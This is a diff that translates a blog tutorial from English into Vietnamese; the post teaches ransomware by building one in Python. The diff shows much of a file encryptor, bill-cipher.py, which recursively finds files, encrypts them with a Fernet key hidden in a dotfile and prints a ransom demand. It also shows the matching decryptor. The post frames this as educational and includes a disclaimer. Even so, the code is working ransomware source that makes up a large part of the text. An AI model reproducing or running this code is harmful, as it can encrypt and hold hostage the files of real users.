@@ -11,23 +11,23 @@ description: "Học về ransomware bằng cách làm 1 con ransomware"
 
 > **Lưu ý**: **Không** sử dụng phần mềm này cho việc xấu. Phần mềm này được làm cho mục đích học tập. Nếu bạn muốn chạy ransomware này thì chạy nó trong môi trường ảo, môi trường đã được cách ly. **Đừng sử dụng nó cho việc xấu!**
 
-Ever since I started watching Mr. Robot, I got really interested in hacking and hackers. I'm not a hacker myself but I do like learning about how people have found ways to exploit computers.
+Kể từ khi mình bắt đầu xem phim *Mr. Robot*, mình thấy rất hứng thú với hacker và hack. Mình không phải là hacker nhưng mình rất thích học về các cách hack mà nhiều người khác nghĩ ra.
 
-One type of exploit that caught my eyes is *ransomware*. The idea that a program can just encrypt your computer with all your files and make you pay to get them back is both terrifying and fascinating. 
+1 cách hack mà mình thấy rất thú vị là *ransomware*. Phần mềm này có khả năng mã hóa hết các file trên máy tính và tống tiền mình để giải mã các file đó. Với mình thì nó vừa đáng sợ, vừa thú vị.
 
-When I was learning about how ransomware attacks work, I decided to try making a simple (and rather harmless) ransomware myself to understand them better. So let's learn about ransomware by making one!
-
-___
-
-# The concept
-A ransomware will encrypt the files on the victim's machine and will decrypt the files once the attacker allows it to (usually after the victim has paid some money).
-
-So we need a way to find all the files on a machine, encrypt them with a key, and then later on, decrypt those files with the same key we used to encrypt them.
+Trong lúc mình học về ransomware, mình quyết định tự làm 1 con ransomware đơn giản và không có hại mấy để hiểu về ransomware hơn. Vậy nên trong bài đăng này chúng ta sẽ cùng học về ransomware bằng cách lập trình nó!
 
 ___
 
-# The environment
-For this project, we will use a cryptography library to be able to encrypt and decrypt the files. I opted for a library called `cryptography` and we can install this by using `pip`.
+# Ý tưởng đằng sau ransomware
+Ransomware sẽ mã hóa hết các file trên máy tính và chỉ giải mã các file đó khi mà hacker cho phép nó giải mã (điều này thường xảy ra sau khi nạn nhân bị hack đã trả tiền cho hacker).
+
+Chúng ta sẽ cần 1 cách để tìm hết các file trên máy tính, mã hóa nó bằng 1 cái key (chìa khóa) giống như khóa bằng móc khóa ngoài đời thật, và giải mã nó bằng key mà mình dùng để mã hóa nó.
+
+___
+
+# Môi trường lập trình
+Mình cần dùng *thư viện mã hóa* trong Python để mã hóa và giải mã các file mình tìm đc. Mình sử dụng thư viện có tên là `cryptography` và chúng ta có thể tải thư viện này bằng `pip`.
 
 ```bash
 pip install cryptography
@@ -35,21 +35,21 @@ pip install cryptography
 
 ___
 
-# The encryption
-So, how do we encrypt all the files on a machine? First of all, we need to find all the files on a machine. To do this, we can use the `os` library. We'll also use the cryptography library we just installed for encryption.
+# Cách tìm và mã hóa file
+Thế làm thế nào để mình mã hóa hết các file trên máy? Đầu tiên thì mình phải tìm được hết các file trên máy tính. Mình sử dụng thư viện `os` của Python để tìm file. Mình cũng sẽ sử dụng thuật toán *Fernet* ở trong thư viện mã hóa mình vừa cài để mã hóa các file.
 
 ```py
 import os
 from cryptography.fernet import Fernet
 ```
 
-We will find all the files and put them into a list called `files`.
+Chúng ta lưu các file trên máy mà chúng ta tìm được trong 1 danh sách gọi là `files`.
 
-We will need to check whether a 'file' is a directory or a file, we can use `os.path.isfile()` to check it. If the 'file' is not a file and is a directory, we can go into that directory recursively find all the files within that directory.
+Chúng ta cần check xem cái "file" đó là 1 file bình thường hay là 1 folder. Chúng ta có thể dùng hàm `os.path.isfile()` để check. Nếu như "file" đó không phải là file mà là folder thì chúng ta cần đi vào trong folder đó và check các file trong folder đó. Nếu folder đó có folder thì sẽ tiếp tục vào folder trong folder đó.
 
-After we're finished with looking through a directory, we can go out of the directory and save the relative path to the file we found.
+Sau khi chúng ta tìm đường dẫn của các file, chúng ta sẽ lưu đường dẫn tới các file đó trong danh sách `files`.
 
-We also want to avoid our encryption and decryption files along with our key file that will later save our decryption key.
+Chúng ta cũng cần tránh không lưu chương trình mã hóa, giải mã và key của mình trong lúc tìm kiếm file bởi vì nếu như chúng ta mã hóa file giải mã và file key thì sau này sẽ không giải mã các file được.
 
 ```py
 # bill-cipher.py
@@ -75,11 +75,9 @@ def find_files():
 files = find_files()
 ```
 
-Now we need a key to encrypt the files with.
+Tiếp theo, chúng ta cần tạo key để mã hóa các file chương trình của mình đã tìm được. Key này sẽ được lưu trong `.a_deal` (mình lưu trong file thế này bởi vì các file có chấm ở đầu tên file sẽ được ẩn trên các hệ thống Unix).
 
-This key will be saved in a file named `.a_deal` because dotfiles will be hidden on Linux systems.
-
-After we generated the key, we want to open all the folders, read their contents, encrypt the contents, then write all of the encrypted contents back into the files. 
+Sau khi chúng ta tạo key thì chúng ta sẽ cần mở các file bằng đường dẫn mình lưu trong `files`, đọc file và mã hóa nội dung mình đọc được từ file, rồi viết nội dung đã mã hóa vào lại file. Mình đọc và viết ở chế độ nhị phân bởi vì thuật toán Fernet được dùng cho nhị phân.
 
 ```py
 key = Fernet.generate_key()
@@ -97,7 +95,8 @@ for file in files:
 		f.write(content_encrypted)
 ```
 
-So the complete encryption program (`bill-cipher.py`) will look something like this:
+Thế là xong chương trình mã hóa file (`bill-cipher.py`). Đây là code cho chương trình mã hóa này:
+
 ```py
 #!/usr/local/bin/python3 
 
@@ -141,32 +140,32 @@ for file in files:
 	with open(file, "wb") as f:
 		f.write(content_encrypted)
 
-print("Files are encrypted! Send me moneyyyyyyyyyyyyyyy")
+print("File đã bị mã hóa! Trả tiền thì sẽ giải mã")
 ```
 
-Now, if we run `bill-cipher.py`, we can see that all the files that this program can get its hand on becomes a jumble of illegible letters.
+Nếu như mình chạy file `bill-cipher.py` thì có thể thấy là các file mà chương trình này tìm được sẽ bị mã hóa và trở thành file chứa 1 đống chữ cái, ký tự random.
 
 ![file1-encrypted](/img/file1-encrypted.png)
 
-Even the image files become unreadable.
+Chương trình này cũng có thể mã hóa file ảnh và video nữa.
 
 ![pic-encrypted](/img/pic-encrypted.png)
 
-So now that we have the files encrypted, we need some way to decrypt it.
+Chúng ta biết cách tìm và mã hóa các file trên máy rồi, bây giờ chúng ta cần cách giải mã các file đó.
 
 ___
 
-# The decryption
-In order to decrypt it, we need to do the exact same thing as when we encrypted the files but a little different.
+# Cách giải mã
+Để giải mã các file bị mã hóa, chúng ta sẽ cần tìm các file đó trước. Thế nên chugns ta sẽ dùng đoạn code tìm file của chương trình mã hóa trên.
 
-Instead of creating a new key, we read the key from `.a_deal` because this is the key that was used to encrypt the files.
+Sau khi tìm được file, chúng ta cần đọc key trong `.a_deal` để giải mã các file bị mã hóa bằng key này.
 
 ```py
 with open(".a_deal", "rb") as deal:
 	key = deal.read()
 ```
 
-When we read each of the files, we need to use the key that we read from `.a_deal` to decrypt it instead of encrypting it like we did before.
+Chúng ta sẽ đọc nội dung file ở chế độ nhị phân, giải mã bằng key trong `.a_deal` và viết nội dung đã giải mã vào lại file đó.
 
 ```py
 for file in files:
@@ -179,7 +178,7 @@ for file in files:
 		f.write(content_decrypted)
 ```
 
-So the complete decryption program (`bill-decipher.py`) will look a bit something like this:
+Thế là xong chương trình giải mã file (`bill-cipher.py`). Đây là code cho chương trình giải mã này:
 
 ```py
 #!/usr/local/bin/python3 
@@ -222,24 +221,24 @@ for file in files:
 	with open(file, "wb") as f:
 		f.write(content_decrypted)
 
-print("Files decrypted!")
+print("File đã được giải mã!")
 ```
 
-And after running this, we can read the content of our files.
+Sau khi chúng ta chạy chương trình này, chúng ta có thể đọc lại nội dung gốc của các file đã bị mã hóa.
 
 ![file1-decrypted](/img/file1-decrypted.png)
 
-We can also see our image files.
+Chúng ta cũng có thể xem lại các file ảnh và video.
 
 ![pic-decrypted](/img/pic-decrypted.png)
 
 ___
 
-# The conclusion
-So there we have it, an encryption and decryption program that makes up a ransomware. Of course, this is a very simple and rather harmless ransomware. In fact, if someone is a bit tech savvy, they won't have much trouble decrypting the files. 
+# Kết luận
+Đó là 2 chương trình mã hóa và giải mã. 2 chương trình đó sẽ kết hợp lại thành 1 con *ransomware*. Đây chỉ là con ransomware rất đơn giản và vô hại, nếu như nạn nhân có 1 ít kiến thức về mã hóa và giải mã thì họ sẽ không có vấn đề gì trong việc giải mã các file bị mã hóa.
 
-But what's at this ransomware's core is also what's at any other ransomware's core, the ability to find and encrypt all the files on the computer and the ability to decrypt them later on.
+Nhưng lõi của con ransomware cũng giống như lõi của các con ransomware khác: Khả năng *tìm* và *mã hóa* các file trên máy tính và khả năng *giải mã* các file đó.
 
-This is the basic principle that every ransomware operates on.
+Đó là cách vận hành của mọi ransomware.
 
-> You can find the source code for this project [here](https://github.com/namberino/simple-ransomware).
+> Bạn có thể đọc mã nguồn của dự án này tại [đây](https://github.com/namberino/simple-ransomware)
